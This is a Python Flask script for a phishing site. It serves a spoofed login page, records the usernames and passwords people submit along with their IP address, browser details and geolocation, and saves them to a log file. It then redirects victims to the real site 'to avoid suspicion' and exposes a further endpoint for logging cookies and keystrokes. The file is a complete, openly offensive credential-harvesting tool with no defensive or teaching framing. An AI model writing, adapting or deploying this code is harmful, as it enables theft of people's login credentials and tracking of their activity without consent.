from flask import Flask, request, render_template_string, redirect
import os
from datetime import datetime
import requests
import json

app = Flask(__name__)

# Create a directory for logs if it doesn't exist
if not os.path.exists("logs"):
    os.makedirs("logs")

# HTML for the spoofed login page (editable for customization)
spoofed_page = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
        h2 { color: #333; }
        input[type="text"], input[type="password"] {
            padding: 10px; margin: 10px; width: 200px;
            border-radius: 5px; border: 1px solid #ddd;
        }
        button {
            padding: 10px 20px; background-color: #4CAF50; color: white;
            border: none; border-radius: 5px; cursor: pointer;
        }
        button:hover { background-color: #45a049; }
    </style>
</head>
<body>
    <h2>Login</h2>
    <form action="/login" method="POST">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" required><br><br>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required><br><br>
        <button type="submit">Login</button>
    </form>
</body>
</html>
"""

@app.route('/')
def home():
    # Serve the spoofed login page
    return render_template_string(spoofed_page)

@app.route('/login', methods=['POST'])
def login():
    # Collect credentials from the login form
    username = request.form.get('username')
    password = request.form.get('password')

    # Collect additional information
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent')

    # Optional: Fetch geolocation data (via ipinfo.io API)
    geo_info = None
    try:
        response = requests.get(f"https://ipinfo.io/{ip_address}/json")
        geo_info = response.json()
    except Exception as e:
        geo_info = {"error": str(e)}

    # Log the collected data
    with open('logs/captured_data.txt', 'a') as f:
        f.write(f"Timestamp: {datetime.now()}\n")
        f.write(f"IP Address: {ip_address}\n")
        f.write(f"User-Agent: {user_agent}\n")
        f.write(f"Geolocation: {geo_info}\n")
        f.write(f"Username: {username}\n")
        f.write(f"Password: {password}\n")
        f.write("-" * 50 + "\n")

    # Redirect to the legitimate site to avoid suspicion
    return redirect("https://www.real-site.com", code=302)

@app.route('/track', methods=['POST'])
def track():
    # Endpoint for tracking data such as cookies, keystrokes, etc.
    data = request.json
    with open('logs/interaction_logs.txt', 'a') as f:
        f.write(f"{datetime.now()}: {json.dumps(data)}\n")
    return "Data logged", 200

if __name__ == '__main__':
    # Running the app on a public server (to be accessed globally)
    # Use host='0.0.0.0' to make it publicly accessible
    print("Spoof site running... Logs are being saved in the 'logs' folder.")
    app.run(host='0.0.0.0', port=5000)
